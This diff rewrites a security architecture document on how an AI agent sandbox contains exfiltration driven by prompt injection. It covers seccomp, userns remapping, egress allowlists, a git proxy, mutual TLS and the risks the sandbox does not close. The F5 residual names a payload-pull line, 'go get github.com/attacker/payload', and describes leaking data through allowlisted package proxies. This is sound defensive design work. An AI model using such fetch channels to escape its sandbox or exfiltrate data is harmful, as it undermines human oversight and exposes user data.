@@ -1,230 +1,150 @@
-# Mainguard Security Architecture — Sandbox Egress & Exfiltration Controls
+# Security architecture — sandbox egress & exfiltration
 
-**Status:** Living document · **Owner (long-term):** P2-17 (network transparency) · **Seeded by:** P2-07
-(sandbox hardening + default-deny egress). This file states the accepted-and-stated residuals now so the
-guarantee is honest before P2-17 expands it.
+What bounds prompt-injection exfiltration from an agent sandbox, and **what it does not close**.
+Read the [Residuals](#residuals) before describing the sandbox as airtight: the controls make
+exfiltration expensive and observable, not impossible.
 
-This document records the structural controls that bound prompt-injection exfiltration from an agent
-sandbox, and — crucially — the **residual** that those controls do *not* close, so no reader mistakes
-"default-deny egress" for "no exfiltration is possible."
+Living document · seeded by P2-07 · long-term owner P2-17.
 
-## The layered controls (P2-07)
+## Controls
 
-| # | Control | Kind | Where |
-|---|---|---|---|
-| S-1 | P2-06 quarantine: no git-host credential and no remote but the daemon bare mirror | STRUCT | `WorktreeManager` |
-| G-15 | Hardened container spec: `no-new-privileges`, default-deny seccomp (moby default + the 3 memory-inspection denials), `CapDrop ALL`, **userns-remap (MG-17 — see below; enforced by the daemon config + the boot check, and the per-container `--userns=host` opt-out is a typed builder error)**, limits, read-only rootfs | STRUCT/CHECK | `ContainerSpecBuilder`, `UsernsRemapPolicy`, `FirstBootStep` |
-| G-11 | ext4-only worktree mount; Windows/UNC sources rejected at construction | STRUCT | `ContainerSpecBuilder` |
-| — | Default-deny egress: internal network + allowlist proxy + pinned DNS + iptables backstop | STRUCT/CHECK | `EgressProxyConfigurator` |
-| A6 | Git host absent from the agent allowlist; the only path to it is the daemon read-only, prefix-allowlisted git proxy; push has no code path | STRUCT | `EgressAllowlist`, `DaemonGitProxy` |
-| G2 | Anti-memory-inspection quartet, so the agent uid obtains zero bytes of the OOB key `K` | STRUCT | controls 1/3/4 in `ContainerSpecBuilder`; control 2 (`kernel.yama.ptrace_scope`) VM-wide in P2-05 |
+| # | Control | Where |
+|---|---|---|
+| S-1 | Quarantine: no git-host credential, no remote but the daemon bare mirror | `WorktreeManager` |
+| G-15 | Hardened spec: `no-new-privileges`, default-deny seccomp, `CapDrop ALL`, userns-remap, limits, read-only rootfs | `ContainerSpecBuilder`, `UsernsRemapPolicy`, `FirstBootStep` |
+| G-11 | ext4-only worktree mount; Windows/UNC sources rejected at construction | `ContainerSpecBuilder` |
+| A6 | Git host absent from the agent allowlist; only route is the daemon read-only git proxy | `EgressAllowlist`, `DaemonGitProxy` |
+| G2 | Anti-memory-inspection quartet — the agent uid gets zero bytes of the OOB key `K` | `ContainerSpecBuilder`; ptrace sysctl in P2-05 |
+| — | Default-deny egress: internal network + allowlist proxy + pinned DNS + iptables backstop | `EgressProxyConfigurator` |
 
-## MG-17 — the user-namespace remap, and what it is (and is not)
-
-This row used to say "userns" while `/etc/docker/daemon.json` set **no** `userns-remap` and the
-container spec's `UsernsMode` was an empty string. With no daemon-level remap the empty string means
-"do what the daemon does", i.e. nothing: container uid 0 **was** host uid 0, and the agent CLI's
-container uid 1000 **was** the VM's `mainguard` service user — the uid that owns the daemon, its
-keyring, its SQLite state and every binary the jails execute. Every byte a jail wrote through a bind
-mount landed owned by the most privileged unprivileged identity in the VM.
-
-dockerd now runs with `"userns-remap": "mainguard"` and a **pinned** subordinate range
-(`/etc/subuid`+`/etc/subgid` = `mainguard:100000:65536`), so container id *N* maps to host id
-*100000 + N*: container root → 100000, the agent → 101000, the supervisor uid → 101001. Both remapped
-identities own nothing else on the VM.
-
-**Bind-mount ownership.** Docker does not chown bind-mount sources, and the daemon *creates and keeps
-writing* the two read-write ones (`~/mainguard/repos`, `~/mainguard/worktrees`) while running
-unprivileged as uid 1000 — so it can neither chown them to 101000 nor write a tree owned by it. They are
-therefore **shared through a group whose gid IS the remapped agent gid** (`mainguard-jail` = 101000, of
-which the daemon is a member), with the setgid bit on both parents so everything created inside inherits
-it. That is stronger than an owner-chown would have been: the jail reads and writes the content it
-needs, but owns neither tree (it cannot `chmod`/`chown`/replace them) and has **no** access at all to
-anything else under `/home/mainguard`. The read-only `adapters` mount is `a+rX` and deliberately not in
-that group; the read-only coordinator IPC dir already grants the traversal/connect bits it needs.
-
-**MG-3 ordering.** `docs/design/mg-3-mediated-ref-updates.md` (the approved plan of record) names this
-change as its prerequisite so that the per-agent repositories it introduces at
-`<vmRoot>/agents/<hash>/<agentId>.git` are created with correct ownership *by construction*. That
-parent directory is therefore provisioned here, ahead of use, with the same `2775
-mainguard:mainguard-jail` setgid treatment — MG-3 has to do nothing about ownership at all, only make
-the content of a new git dir group-writable (`core.sharedRepository=group`), because umask is a
-property of the writing process and no parent directory can supply it. Nothing here makes flipping the
-mirror mount to read-only (MG-3 Stage 3) harder: a read-only mount needs read+traverse only, which the
-group already grants.
-
-**The check, not the config.** `FirstBootStep`'s check phase asserts the remap is *in effect* — `docker
-info` reports the `name=userns` security option **and** its `DockerRootDir` is
-`/var/lib/docker/100000.100000`, which is the only direct evidence that the remap running is the one the
-mount ownership was provisioned against. The probe's output is sentinel-framed so "docker answered
-nothing" is a distinct, reported outcome and can never be read as a pass.
-
-**Migration.** Turning the remap on relocates dockerd's whole storage root, so the previous root's
-images, containers and networks become invisible rather than deleted. The images self-heal (the startup
-auto-provision sees them as *Missing* and `docker load`s the bundled CI tars; image ids and the
-`mainguard.image.version` labels ride the tar unchanged, so the MG-27 digest pin and the label check are
-unaffected). Mainguard's containers and networks do not, so they are removed with the OLD daemon on the
-one boot that performs the flip — which is also the single, one-time recreate of the shared egress proxy.
+The container-spec builder asserts G2's controls on **every** create request; dropping any is a typed
+builder error. A per-container `--userns=host` opt-out is likewise a typed error.
 
 ## A6 — no direct git-host egress
 
-The agent's egress allowlist contains **no git-host entry** by default, and the UI marks a user-added
-git-host entry as defeating A6. Git-sourced installs (`pip install git+https://…`, Go modules, git
-submodules) are served by `DaemonGitProxy`: fetch/`upload-pack` **only**, only for allowlisted
-`host + org` prefixes, performed daemon-side with the daemon's credentials (the sandbox never holds
-git-host credentials — the P2-06 quarantine holds). Push/`receive-pack` has **no code path** — the
-refusal is structural, audited (`egress_denied`), and transparency-logged.
+The agent allowlist has **no git-host entry**, and the UI marks a user-added one as defeating A6.
+Git-sourced installs (`pip install git+https://…`, Go modules, submodules) go through
+`DaemonGitProxy`: fetch/`upload-pack` only, allowlisted `host + org` prefixes only, performed
+daemon-side with the daemon's credentials. **Push/`receive-pack` has no code path** — the refusal is
+structural, audited (`egress_denied`) and transparency-logged.
 
 ## G2 — anti-memory-inspection quartet
 
-The OOB `ControlFrame` forgery-[STRUCT] guarantee depends on the agent uid obtaining zero bytes of `K`.
-Four controls ship together: (1) the `K` tmpfs is mode 0400 owned by a dedicated supervisor uid ≠ the
-agent uid; (2) `kernel.yama.ptrace_scope ≥ 2` VM-wide (P2-05); (3) the seccomp profile denies
-`process_vm_readv`/`process_vm_writev`/`ptrace`; (4) no `CAP_SYS_PTRACE`. The in-container memory scrape
-is closed structurally by (3)+(4) alone; (1) closes the file path; (2) is defense-in-depth. The
-container-spec builder asserts (1),(3),(4) on **every** create request; dropping any is a typed builder
-error.
+Four controls ship together:
 
-**Control (2) is machine-wide, by necessity (MG-33).** WSL2 runs every distro on ONE shared kernel and
-`kernel.yama.ptrace_scope` is not namespaced, so the value `FirstBootStep` writes at first boot applies
-to the user's *other* WSL2 distros too for as long as the WSL VM is up. It is strictly a hardening (it
-restricts ptrace to admin-capable processes), never a weakening, but it is a real side effect outside
-Mainguard's distro: a debugger/profiler attaching to an already-running pid in another distro may start
-needing `sudo`. It is bounded and reversible — the live value resets on the next full `wsl --shutdown`,
-and the persisted `/etc/sysctl.d/99-mainguard-sandbox.conf` drop-in lives *inside* `MainguardEnv`, so it
-goes away with the distro at uninstall. Per-distro scoping is impossible (non-namespaced sysctl) and
-Docker rejects it as a per-container `--sysctl`, which is why it is boot-provisioned VM-wide and
-disclosed in the OOBE progress log rather than narrowed.
+1. the `K` tmpfs is mode 0400, owned by a supervisor uid ≠ the agent uid;
+2. `kernel.yama.ptrace_scope ≥ 2` VM-wide (P2-05);
+3. seccomp denies `process_vm_readv` / `process_vm_writev` / `ptrace`;
+4. no `CAP_SYS_PTRACE`.
 
-The shipped seccomp profile is the **canonical moby/containerd default-deny profile**
-(`defaultAction: SCMP_ACT_ERRNO`, the standard `archMap` and ~300-syscall allowlist) with the three
-memory-inspection syscalls removed from every allow rule and explicitly denied — so the agent keeps the
-full default hardening (`mount`/`bpf`/`pivot_root` stay capability-gated and, under `CapDrop ALL`,
-unreachable; `kexec_load` et al. are default-denied) on top of the G2 denials. Because a custom
-`seccomp=<json>` **replaces** Docker's default rather than layering onto it, the profile reproduces that
-default; it is never `unconfined`. It is a single source of truth: `images/mainguard-agent-base/seccomp.json`
-is embedded into `Mainguard.Agents` (`SeccompProfile.Json`) and passed to `CreateContainerAsync` verbatim, so
-what the tests assert equals what the container runs.
+(3)+(4) close the in-container scrape structurally; (1) closes the file path; (2) is defence in depth.
 
-## F5 — the package-proxy caveat (accepted-and-stated residual)
+The profile is the **canonical moby/containerd default-deny profile** with those three syscalls
+removed from every allow rule and explicitly denied — a custom `seccomp=<json>` *replaces* Docker's
+default rather than layering on it, so it reproduces that default and is never `unconfined`. Single
+source of truth: `images/mainguard-agent-base/seccomp.json`, embedded as `SeccompProfile.Json` and
+passed verbatim, so what the tests assert equals what the container runs.
 
-**"Pull-only" ≠ "cannot fetch attacker code" ≠ "cannot exfiltrate."** A wholesale allowlisted *language*
-proxy (Go proxy, npm, crates) is a general-purpose fetch channel: `go get github.com/attacker/payload`
-resolves a second-stage payload and leaks bytes in the request path even though the git host itself is
-off the agent allowlist. A6 removes the *direct* git route; it does **not** by itself close
-payload-pull or low-bandwidth request-path exfiltration through an allowlisted registry.
+## MG-17 — the userns remap
 
-Compensating controls, in order of preference:
+dockerd runs with `"userns-remap": "mainguard"` and a pinned subordinate range
+(`mainguard:100000:65536`), so container id *N* → host id *100000 + N*: container root → 100000,
+agent → 101000, supervisor → 101001. Neither remapped identity owns anything else on the VM.
 
-1. **Declared-dependency scoping (preferred).** Module fetches route through the daemon proxy with
-   `DeclaredDependencyResolver` resolving `go.mod`/`package.json`/lockfiles to the exact module set;
-   requests outside it are denied (typed `DeclaredDependencyDeniedException`) and logged.
-2. **Transparency + anomaly.** Where a native registry front cannot be replaced (protocol constraints),
-   every package-proxy fetch is a P2-17 transparency line **and** a P2-44 anomaly signal — never silent.
+**Why it mattered.** Before this, `UsernsMode` was empty and the daemon set no remap — container uid 0
+*was* host uid 0, and the agent's uid 1000 *was* the VM's `mainguard` service user, which owns the
+daemon, its keyring, its SQLite state and every binary the jails execute.
 
-**The accepted residual:** public-payload pull plus low-bandwidth request-path exfiltration via an
-allowlisted registry is **accepted and stated**. It is bounded by:
+**Bind-mount ownership.** Docker does not chown bind-mount sources, and the daemon keeps writing the
+two read-write ones as uid 1000, so it can neither chown them to 101000 nor write a tree owned by it.
+They are shared through a group whose gid **is** the remapped agent gid (`mainguard-jail` = 101000),
+setgid on both parents. Stronger than an owner-chown: the jail reads and writes what it needs but
+owns neither tree, and has no access to anything else under `/home/mainguard`. The read-only
+`adapters` mount is `a+rX` and deliberately *not* in that group.
 
-- **no push / no credentials** — nothing an agent fetches lets it write to the git host or exfiltrate
-  through it; the sandbox holds no git-host credential (S-1);
-- **the verify → review → flagged-gate → human-merge backstop** — whatever an injected agent produces is
-  still untrusted code facing human review before any merge. This human-review backstop, not egress, is
-  what actually bounds a determined exfiltrator; egress raises the cost, it is not a proof of no-exfil.
+`<vmRoot>/agents/<hash>/` gets the same `2775 mainguard:mainguard-jail` setgid treatment, so MG-3's
+per-agent repositories are created with correct ownership by construction — a new git dir only has to
+set `core.sharedRepository=group`, because umask is a property of the writing process and no parent
+directory can supply it. Flipping the mirror mount read-only stays possible: that needs read+traverse
+only, which the group already grants.
 
-This residual is intentional and re-stated here so the security posture is honest: the controls above
-make exfiltration expensive and observable, not impossible.
+**The check, not the config.** `FirstBootStep` asserts the remap is *in effect* — `docker info` must
+report the `name=userns` option **and** a `DockerRootDir` of `/var/lib/docker/100000.100000`, the only
+direct evidence that the running remap is the one the mount ownership was provisioned against. The
+probe is sentinel-framed, so "docker answered nothing" is a distinct reported outcome, never a pass.
 
----
+**Migration.** Enabling the remap relocates dockerd's storage root, so prior images, containers and
+networks become invisible rather than deleted. Images self-heal (startup auto-provision sees them
+Missing and `docker load`s the bundled CI tars; ids and `mainguard.image.version` labels ride the tar,
+so the MG-27 digest pin is unaffected). Containers and networks do not, and are removed with the old
+daemon on the single boot that performs the flip.
 
-## The control plane: loopback is not a boundary (MG-19)
+## The control plane — loopback is not a boundary (MG-19)
 
-The daemon's gRPC control plane binds `127.0.0.1:5250` **inside the MainguardEnv WSL2 VM**, while the GUI
-runs on Windows. It used to serve **cleartext h2c** with a per-session bearer token as the *sole* gate.
-That is not sufficient, for reasons that were measured rather than assumed.
+The daemon binds `127.0.0.1:5250` **inside the WSL2 VM**; the GUI runs on Windows. It used to serve
+cleartext h2c with a bearer token as the sole gate. That was insufficient, and the reasons were
+measured, not assumed — on Windows 11 (10.0.26200):
 
-### The `localhostForwarding` exposure (measured)
+| Measurement | Result |
+|---|---|
+| Windows process → `127.0.0.1:<port>`, listener bound to `127.0.0.1` in the VM | **CONNECTED** — `localhostForwarding` relays transparently |
+| The in-VM listener's view of that peer | `127.0.0.1:<ephemeral>`, `/proc/net/tcp` **`uid=0`**, owning pid invisible |
+| `SO_PEERCRED` on that accepted TCP socket | `pid=0 uid=-1 gid=-1` — meaningless (a Unix-socket facility) |
 
-WSL2 enables `localhostForwarding` by default. It relays a Windows-side `127.0.0.1:<port>` connection into
-the in-VM listener, which means **"bound to loopback" buys no isolation at all**: the daemon port is
-reachable from any process in the Windows user's session, and — because all WSL2 distros share one
-network stack under the default NAT mode — from the user's *other* distros too. Measured on
-Windows 11 (10.0.26200) with WSL2:
+**The relay launders peer identity.** Any credential readable on the TCP path describes the WSL relay
+(root, in-VM), never the calling Windows process. No peer-authentication scheme can be built on it.
+And because all WSL2 distros share one network stack under NAT, the port is reachable from the user's
+other distros too.
 
-| # | Measurement | Result |
+**A Unix socket was tried and rejected** — it cannot work for this topology:
+
+| Measurement | Result |
+|---|---|
+| In-VM UDS, in-VM client | CONNECTED; `SO_PEERCRED` returns real `pid`/`uid`/`gid` |
+| Windows process → that socket via `\\wsl.localhost\<distro>\…` | **`WSAENETDOWN` (10050)** |
+| Control: Windows process → an AF_UNIX socket on the Windows filesystem | CONNECTED — so the above is a real negative |
+
+The 9P share *displays* the socket (`File.Exists` true, length 0), which makes this look like a path
+bug. It is not: 9P carries no socket semantics, so there is nothing to `connect()` to. A UDS control
+plane would need an in-VM relay back to a TCP port — reintroducing the exposure with an extra hop.
+
+**What shipped: pinned mutual TLS.** Both ends pinned by SHA-256 fingerprint to material minted fresh
+each daemon start (`SessionTransportCertificates`, `0600` beside `daemon.token`). No plaintext
+fallback, no downgrade knob. This closes: the token crossing the wire in cleartext; **port squatting**
+(the client pins the daemon cert, so a handshake with an impostor fails before any HTTP/2 frame is
+written — the token is never sent); and unauthenticated reachability (rejected at handshake, before
+the HTTP/2 parser and `BearerTokenInterceptor`).
+
+## Runtime toolchain — pre-baked, not `devbox add`
+
+The intent was runtime `devbox add <tool>`. Not achievable under strict A6: devbox resolves through
+nixhub then fetches **nixpkgs from github** at run time — the git host A6 exists to keep off the
+agent's egress. Every workaround either still re-fetches github or needs a full local nixpkgs
+evaluation.
+
+**Decision:** the curated toolchain (jq, ripgrep, fd, tree, gnumake, nodejs, python3, go) is
+Nix-installed **at image-build time** into `/opt/toolchain`, on the agent's PATH from the read-only
+image. At runtime the tools run with **zero egress** — no git host, no nixhub, not even
+`cache.nixos.org` — so A6 stays intact and the rootfs stays read-only. A fixed audited toolchain is
+also a stronger posture than arbitrary runtime pulls: it closes the F5 fetch channel below.
+
+## Residuals
+
+Stated deliberately, so no reader mistakes default-deny egress for "no exfiltration is possible".
+
+| # | Residual | Bounded by |
 |---|---|---|
-| 1 | Windows .NET process → `127.0.0.1:<port>`, listener bound to `127.0.0.1` inside the VM | **CONNECTED** — the relay is real and transparent |
-| 2 | The in-VM listener's view of that peer | `127.0.0.1:<ephemeral>`, `/proc/net/tcp` **`uid=0`**, owning pid not visible in the user namespace |
-| 3 | `SO_PEERCRED` on that accepted TCP socket | `pid=0 uid=-1 gid=-1` — meaningless (it is a Unix-socket facility) |
+| **F5** | An allowlisted *language* proxy (Go, npm, crates) is a general-purpose fetch channel: `go get github.com/attacker/payload` resolves a second-stage payload and leaks bytes in the request path. A6 removes the *direct* git route; it does not close payload-pull or low-bandwidth request-path exfiltration. | **Declared-dependency scoping (preferred):** `DeclaredDependencyResolver` resolves `go.mod`/`package.json`/lockfiles to the exact module set; requests outside it are denied (`DeclaredDependencyDeniedException`) and logged. Where a native registry front can't be replaced, every fetch is a P2-17 transparency line **and** a P2-44 anomaly signal — never silent. Plus no push, no credentials (S-1), and the verify → review → flagged-gate → human-merge backstop — **that**, not egress, is what bounds a determined exfiltrator. |
+| **MG-19** | A process running as the **same OS user** can read `daemon-client.pfx` and impersonate the client. No local transport defeats a same-uid attacker — a `0600` socket with `SO_PEERCRED` would not either, since the peer uid would match. | The bar moves from *read one file* to *read two files and complete a mutual handshake*; sniffing and port-squatting close outright. |
+| **MG-33** | `kernel.yama.ptrace_scope` is not namespaced and WSL2 shares one kernel, so the value applies to the user's **other WSL2 distros** while the VM is up. A debugger attaching to a running pid elsewhere may start needing `sudo`. | Strictly a hardening, never a weakening. Resets on `wsl --shutdown`; the persisted drop-in lives inside `MainguardEnv` and goes away at uninstall. Per-distro scoping is impossible (non-namespaced sysctl; Docker rejects it as `--sysctl`). |
 
-Measurement 2 is the important one: **the relay launders peer identity.** Even if a peer credential could
-be read on the TCP path, it would describe the WSL relay (root, in-VM), never the Windows process that
-actually made the call. No peer-authentication scheme can be built on the loopback TCP path itself.
+### Deferred work
 
-### Why not a Unix-domain socket + `SO_PEERCRED`
+Tracked in [`STATUS.md`](STATUS.md#open-items-outside-the-task-list):
 
-This was the first choice, and it was measured and **rejected**: it cannot work for the shipped topology.
-The daemon is in the VM and the GUI is on Windows, and an AF_UNIX socket inside the VM is not connectable
-from a Windows process.
-
-| # | Measurement | Result |
-|---|---|---|
-| 4 | In-VM UDS at `$HOME/…/daemon.sock`, in-VM client | CONNECTED; `SO_PEERCRED` returns a real `pid`/`uid`/`gid` |
-| 5 | Windows .NET process → that socket via `\\wsl.localhost\<distro>\home\…\daemon.sock` | **`SocketException` `NetworkDown` (WSAENETDOWN, 10050)** |
-| 6 | Control: Windows .NET process → an AF_UNIX socket it created on the Windows filesystem | CONNECTED — so measurement 5 is a real negative, not a broken-AF_UNIX artifact |
-
-The 9P share *displays* the socket (`File.Exists` is `true`, attributes `ReparsePoint`, length 0), which
-makes this failure mode easy to mistake for a path bug. It is not: 9P carries no socket semantics, so
-there is nothing to `connect()` to. A UDS control plane would require an in-VM relay process bridging
-back to a TCP port — reintroducing exactly the exposure above, with an extra hop.
-
-### What shipped instead: pinned mutual TLS
-
-The control-plane listener now requires **mutually-authenticated TLS**, with both ends pinned by SHA-256
-fingerprint to material minted fresh on every daemon start (`SessionTransportCertificates`, written beside
-`daemon.token` with the same `0600` / single-ACE-DACL protection). There is deliberately **no plaintext
-fallback and no downgrade knob** — the client throws rather than connect unauthenticated.
-
-What this closes:
-
-1. **The token no longer crosses the wire in cleartext.** Every RPC used to carry it in plaintext across
-   loopback and the WSL relay, harvestable by anything that could observe local traffic.
-2. **Port squatting.** The client used to hand its bearer token to whatever answered on `127.0.0.1:5250`,
-   with no way to tell. An unprivileged process that bound the port before `mainguardd` started could
-   collect the operator token on the first RPC. The client now pins the daemon's certificate, so the
-   handshake with an impostor fails *before any HTTP/2 frame is written* — the token is never sent.
-3. **Unauthenticated reachability.** A peer without the pinned client certificate is rejected during the
-   TLS handshake, before the HTTP/2 parser, the gRPC dispatcher, and `BearerTokenInterceptor`.
-
-**The accepted residual — stated plainly.** A process running as the **same OS user** can read
-`daemon-client.pfx` beside the token and impersonate the client. No local transport defeats a same-uid
-attacker: a `0600` Unix socket with `SO_PEERCRED` would not have either, because the peer uid would match.
-The honest claim is that the bar moves from *read one file* to *read two files and complete a mutual
-handshake*, and that the sniffing and port-squatting vectors close outright. A host-un-forgeable presence
-factor remains deferred (OPS §10.1), and `PeerCredentialIdentityResolver` still resolves the daemon's own
-identity — the connection now carries a genuine peer credential, so deriving approver identity from the
-client certificate is unblocked future work, not something already done.
-
----
-
-## Runtime toolchain: pre-baked, not `devbox add` (A6 decision)
-
-The design intent was that agents sideload toolchains at runtime via `devbox add <tool>`. In a strict
-A6 jail this is not achievable: devbox resolves packages through nixhub and then fetches **nixpkgs from
-github** (`api.github.com` / `github.com/NixOS/nixpkgs/archive/<rev>.tar.gz`) at run time — reaching the
-git host A6 exists to keep off the agent's egress. Every strict-A6 workaround (pinning `nixpkgs.commit`,
-an exact-commit flakeref, a local `path:` nixpkgs) either still re-fetches github or requires a full,
-slow local nixpkgs evaluation.
-
-**Decision:** the curated toolchain (jq, ripgrep, fd, tree, gnumake, nodejs, python3, go) is **Nix-installed
-at image-build time** into a persistent `/opt/toolchain` profile that is on the agent's PATH from the
-read-only image. At runtime the tools are present and runnable with **zero egress** — no git host, no
-nixhub, not even `cache.nixos.org` — so A6 stays fully intact and the read-only rootfs is preserved (no
-writable `/nix` volume). A fixed, audited toolchain is also a *stronger* posture than arbitrary runtime
-package pulls: it closes the general-purpose fetch/exfil channel the F5 caveat above describes.
-
-**Accepted residual → filed as P2-46 (the lead v1.x feature):** an agent cannot add an *arbitrary* new
-tool at runtime. The A6-clean solution — a **daemon-mediated** nix resolver + binary mirror that resolves
-and fetches the closure daemon-side (the daemon being the only component permitted a git host / nixhub,
-exactly as the P2-06 read-only git proxy is) and injects it into the jail, keeping the git host off the
-*agent* allowlist — is specified as **P2-46** in the master implementation document and slated as the
-first post-v1.0 feature. The `devbox` binary is baked so that path can be built on later.
+- **A host-un-forgeable presence factor** (OPS §10.1) — the answer to the MG-19 residual.
+- **Approver identity from the client certificate** — the connection now carries a genuine peer
+  credential, so this is unblocked. It was never implemented.
+- **P2-46** — a daemon-mediated nix resolver + binary mirror, resolving the closure daemon-side and
+  injecting it into the jail, so an agent can add an arbitrary tool without the git host reaching the
+  agent allowlist. The `devbox` binary is baked so that path can be built later.
